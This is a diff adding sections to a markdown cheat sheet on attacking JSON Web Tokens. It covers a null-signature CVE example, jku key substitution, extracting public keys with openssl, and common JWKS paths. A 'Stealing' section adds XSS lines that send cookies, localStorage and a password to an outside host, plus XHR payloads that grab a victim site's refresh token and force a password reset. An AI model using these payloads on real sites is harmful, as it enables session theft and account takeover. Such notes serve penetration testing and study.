@@ -103,6 +103,7 @@ python3 jwt_tool.py -t <url> -rc "jwt_cookie=...;anothercookie=something" -M pb
 
 - metadata of the token, telling the application what type of the token it is, how the token is signed, where the signing key or secret is stored, and other details
 - Some standard claims
+
 | Token | Description | Format |
 | --------- | ------------------ | ------------- |
 | typ | Type of token (JWT/JWE/JWS etc) | string |
@@ -183,7 +184,7 @@ identified for the service as the secret]
 
 ## CVE-2020-28042 - null signature attack
 
-- like alg:none attack 
+- like alg:none attack, except alg heade left unchange
 ```
 {"typ": "JWT","alg": "HS256"}.  
 {"login": "ticarpi"}.  
@@ -197,9 +198,63 @@ identified for the service as the secret]
 ```
 {
 	"typ": "JWT",
-	"alg":"RS256", 
+	"alg":"RS256",
 	"jku":"https://ticarpi.com/jwks.json"
 }.  
 {"login": "ticarpi"}.  
 [Signed with new Private key; Public key exported]
+```
+
+# Finding Public Keys
+
+## Get public key from websites
+
+```sh
+openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem
+openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
+```
+
+## JWKS common locations
+
+- `/.well-known/jwks.json`
+- `/openid/connect/jwks.json`
+- `/jwks.json`
+- `/api/keys`
+- `/api/v1/keys`
+
+- jku - claim pointing towards the JWKS URL
+- x5u - claim pointing towards the X509 certificate location
+
+# Stealing 
+
+## Via XSS
+
+```javascript
+document.location = "http://example.com/cookiesteal.php?c="+document.cookie;
+new Image().src = "http://example.com/log.php?localStorage="+JSON.stringify(window['locatStorage']);
+document.location = 'http://example.com/?password='+secretPasswordVariable;
+```
+
+## XHR CORS
+
+```html
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://www.avictimwebsitewithJWTcookieauth.com/api/refreshtoken");
+xhr.withCredentials = true;
+xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+xhr.send();
+</script>
+```
+
+## XHR CSRF
+
+```html
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "http://www.avictimwebsitewithJWTcookieauth.com/api/passwordreset");
+xhr.withCredentials = true;
+xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+xhr.send('{"newpass":"BadGuyKnowsThis!"}');
+</script>
 ```
